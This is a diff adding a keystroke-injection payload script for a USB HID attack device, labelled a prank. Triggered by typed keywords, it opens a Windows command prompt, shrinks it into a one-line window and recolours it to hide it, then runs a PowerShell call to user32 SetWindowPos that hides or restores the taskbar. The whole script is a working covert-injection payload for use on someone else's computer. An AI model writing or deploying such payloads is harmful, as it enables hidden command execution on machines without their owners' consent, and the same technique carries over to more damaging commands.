@@ -1,0 +1,35 @@
+# Title:        Hide-StartBar
+# Description:  Hides the Windows startbar
+# Author:       Cribbit
+# Version:      1.0
+# Category:     pranks
+# Target:       Windows 7+
+# Attackmodes:	HID
+# Notes:        0x0080 = SWP_HIDEWINDOW, 0x0040 = SWP_SHOWWINDOW
+
+MATCH hide_start
+MATCH show_start
+
+if [[ "$LOOT" == "hide_start" ]];then
+	myflag="0x0080"
+else
+	myflag="0x0040"
+fi	
+
+QUACK LOCK
+QUACK GUI r
+sleep 5
+QUACK STRING "cmd"
+QUACK ENTER
+sleep 10
+# Obfuscate the command prompt
+QUACK STRING "mode con:cols=18 lines=1"
+QUACK ENTER
+QUACK STRING "color FE"
+QUACK ENTER
+# Finds the StartBar windows handle and then sets is positioning flag to hidden
+QUACK STRING "powershell \"\$w=Add-Type -Namespace Win32 -Name Funcs -PassThru -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr FindWindow(String C, String A); [DllImport(\\\"user32.dll\\\")] public static extern bool SetWindowPos(IntPtr H,IntPtr A,int X,int Y,int C,int D,uint F);';\$w::SetWindowPos(\$w::FindWindow('Shell_traywnd',''),0,0,0,0,0,$myflag);\""
+QUACK ENTER
+QUACK STRING exit
+QUACK ENTER
+QUACK UNLOCK
